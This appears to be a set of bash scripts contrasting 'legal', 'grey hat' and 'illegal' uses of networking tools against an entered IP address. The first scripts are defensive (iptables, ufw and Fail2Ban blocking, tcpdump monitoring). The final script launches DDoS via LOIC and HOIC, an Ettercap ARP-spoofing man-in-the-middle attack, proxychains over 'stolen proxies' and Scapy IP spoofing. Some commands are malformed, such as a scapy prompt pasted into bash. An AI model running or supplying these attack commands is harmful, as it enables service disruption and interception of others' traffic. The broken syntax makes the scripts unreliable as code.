echo "[+] Loading optional OSINT & SQL scanner modules..."

echo " 1. Run IP Inspector"
echo " 2. Run SQLMap (legal testing only)"
read -p "Choose tool (1/2): " choice

if [[ $choice == "1" ]]; then
    read -p "Enter IP: " ip
    python3 ip_inspector.py $ip
elif [[ $choice == "2" ]]; then
    read -p "Enter URL: " url
    ./sqlmap_runner.sh $url
else
    echo "[-] Invalid choice."
fi


# !/bin/bash

# Ask for the IP Address to block or monitor
read -p "Enter IP Address to block/monitor: " IP_ADDRESS

# Display IP Address entered
echo "You entered: $IP_ADDRESS"

# Block incoming traffic from the IP
echo "[+] Blocking incoming traffic from $IP_ADDRESS"
sudo iptables -A INPUT -s $IP_ADDRESS -j DROP

# Block outgoing traffic to the IP
echo "[+] Blocking outgoing traffic to $IP_ADDRESS"
sudo iptables -A OUTPUT -d $IP_ADDRESS -j DROP

# Save iptables rules to make the block persistent
echo "[+] Saving iptables rules..."
sudo iptables-save > /etc/iptables/rules.v4

# Block IP using UFW (Uncomplicated Firewall)
echo "[+] Blocking IP using UFW"
sudo ufw deny from $IP_ADDRESS

# Block incoming traffic to the IP for SSH
echo "[+] Denying SSH access for $IP_ADDRESS"
echo "sshd: $IP_ADDRESS" | sudo tee -a /etc/hosts.deny

# Check if Fail2Ban is installed, otherwise install it
echo "[+] Installing Fail2Ban if not already installed..."
sudo apt install fail2ban -y

# Configure Fail2Ban for SSH login blocking
echo "[+] Configuring Fail2Ban for SSH..."
sudo nano /etc/fail2ban/jail.local
# In jail.local, add this section (manually edit the file or use echo commands for automation):
# [sshd]
# enabled = true
# filter = sshd
# action = iptables[name=SSH, port=ssh, protocol=tcp]
# logpath = /var/log/auth.log
# maxretry = 3
# bantime = -1

# Restart Fail2Ban
echo "[+] Restarting Fail2Ban..."
sudo systemctl restart fail2ban

# Capture traffic from the IP using tcpdump (monitoring purpose)
echo "[+] Capturing traffic from IP $IP_ADDRESS"
sudo tcpdump host $IP_ADDRESS

# Mark the IP in a log for reference
echo "[+] Adding $IP_ADDRESS to blacklist log"
echo "$IP_ADDRESS blackhat.attacker" | sudo tee -a /etc/hosts

# Notify user the script is finished
echo "[+] Completed blocking and monitoring for IP: $IP_ADDRESS"


__________________________________________________________________________________


# !/bin/bash

# Ask for the IP Address to block or monitor
read -p "Enter IP Address to block/monitor: " IP_ADDRESS

# Display IP Address entered
echo "You entered: $IP_ADDRESS"

# Block incoming traffic from the IP (Legal Defense)
echo "[+] Blocking incoming traffic from $IP_ADDRESS"
sudo iptables -A INPUT -s $IP_ADDRESS -j DROP

# Block outgoing traffic to the IP (Legal Defense)
echo "[+] Blocking outgoing traffic to $IP_ADDRESS"
sudo iptables -A OUTPUT -d $IP_ADDRESS -j DROP

# Save iptables rules to make the block persistent (Legal Defense)
echo "[+] Saving iptables rules..."
sudo iptables-save > /etc/iptables/rules.v4

# Block IP using UFW (Uncomplicated Firewall) (Legal Defense)
echo "[+] Blocking IP using UFW"
sudo ufw deny from $IP_ADDRESS

# Block incoming traffic to the IP for SSH (Prevent unauthorized access) (Legal)
echo "[+] Denying SSH access for $IP_ADDRESS"
echo "sshd: $IP_ADDRESS" | sudo tee -a /etc/hosts.deny

# Fail2Ban setup (Legal - Security Hardening)
echo "[+] Installing Fail2Ban if not already installed..."
sudo apt install fail2ban -y
echo "[+] Configuring Fail2Ban for SSH..."
sudo nano /etc/fail2ban/jail.local   # Add SSH section here manually
sudo systemctl restart fail2ban

# Monitor traffic from the IP (Legal for authorized pentesting or monitoring)
echo "[+] Capturing traffic from IP $IP_ADDRESS"
sudo tcpdump host $IP_ADDRESS

# Log the IP in a blacklist (Legal - Protection)
echo "[+] Adding $IP_ADDRESS to blacklist log"
echo "$IP_ADDRESS blackhat.attacker" | sudo tee -a /etc/hosts

# Completed message
echo "[+] Completed blocking and monitoring for IP: $IP_ADDRESS"

____________________________________________________________________

# !/bin/bash

# Ask for the IP Address to block or monitor
read -p "Enter IP Address to block/monitor: " IP_ADDRESS

# Display IP Address entered
echo "You entered: $IP_ADDRESS"

# Block incoming traffic from the IP (Ethical monitoring, but unauthorized blocking)
echo "[+] Blocking incoming traffic from $IP_ADDRESS"
sudo iptables -A INPUT -s $IP_ADDRESS -j DROP

# Block outgoing traffic to the IP (Monitoring or testing system security)
echo "[+] Blocking outgoing traffic to $IP_ADDRESS"
sudo iptables -A OUTPUT -d $IP_ADDRESS -j DROP

# Save iptables rules to make the block persistent (Could be a violation of terms if unauthorized)
echo "[+] Saving iptables rules..."
sudo iptables-save > /etc/iptables/rules.v4

# Block IP using UFW (Unauthorised use of UFW can be grey hat activity)
echo "[+] Blocking IP using UFW"
sudo ufw deny from $IP_ADDRESS

# Block SSH access for the IP (Could be a violation if done on a system you don't own)
echo "[+] Denying SSH access for $IP_ADDRESS"
echo "sshd: $IP_ADDRESS" | sudo tee -a /etc/hosts.deny

# Fail2Ban setup (Can be unauthorized or grey hat on systems not owned by the attacker)
echo "[+] Installing Fail2Ban if not already installed..."
sudo apt install fail2ban -y
echo "[+] Configuring Fail2Ban for SSH..."
sudo nano /etc/fail2ban/jail.local  # Add SSH section manually
sudo systemctl restart fail2ban

# Monitor traffic from the IP (Grey hat: Might be considered unauthorized if monitoring a system you don’t own)
echo "[+] Capturing traffic from IP $IP_ADDRESS"
sudo tcpdump host $IP_ADDRESS

# Log the IP in a blacklist (Grey Hat – Logging can be seen as unethical if done without consent)
echo "[+] Adding $IP_ADDRESS to blacklist log"
echo "$IP_ADDRESS greyhat.attacker" | sudo tee -a /etc/hosts

# Completed message
echo "[+] Completed blocking and monitoring for IP: $IP_ADDRESS"
___________________________________________________________________

# !/bin/bash

# Ask for the IP Address to target (illegal, malicious intent)
read -p "Enter IP Address to target: " IP_ADDRESS

# Display IP Address entered
echo "You entered: $IP_ADDRESS"

# DDoS attack using LOIC (Low Orbit Ion Cannon) – **Illegal**
echo "[+] Initiating DDoS attack with LOIC"
loic http://$IP_ADDRESS

# DDoS attack using HOIC (High Orbit Ion Cannon) – **Illegal**
echo "[+] Initiating DDoS attack with HOIC"
hoic -url http://$IP_ADDRESS

# MITM (Man-in-the-Middle) attack using Ettercap – **Illegal**
echo "[+] Initiating MITM attack using Ettercap"
sudo ettercap -T -q -i eth0 -M arp:remote /$IP_ADDRESS/ /192.168.1.1/  # Intercept traffic

# Using Proxychains with stolen proxies to hide identity (illegal evasion) – **Illegal**
echo "[+] Routing traffic through stolen proxies"
proxychains curl http://$IP_ADDRESS

# IP Spoofing with Scapy (illegal, malicious intent) – **Illegal**
echo "[+] Spoofing IP address"
sudo scapy
>>> send(IP(src="$IP_ADDRESS", dst="192.168.1.1")/ICMP())  # Spoof source IP to impersonate traffic

# Log the IP in a blacklist for malicious intent – **Illegal**
echo "[+] Logging $IP_ADDRESS as malicious"
echo "$IP_ADDRESS blackhat.attacker" | sudo tee -a /etc/hosts

# Completed message (This is an illegal action, should not be performed)
echo "[+] Malicious activities executed for IP: $IP_ADDRESS"
